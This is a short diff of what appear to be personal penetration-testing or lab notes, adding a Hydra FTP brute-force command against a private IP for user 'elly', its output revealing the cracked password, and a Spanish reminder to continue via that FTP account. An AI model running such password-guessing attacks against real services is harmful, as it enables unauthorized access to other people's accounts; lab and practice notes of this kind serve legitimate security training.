@@ -91,3 +91,7 @@ drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
 -rw-r--r--  1 root root    0 Jun  5 16:32 ls
 drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
 
+hydra -l elly -e nsr ftp://192.168.1.92 -v
+  [21][ftp] host: 192.168.1.92   login: elly   password: ylle
+
+SEGUIR POR FTP DE ELLY
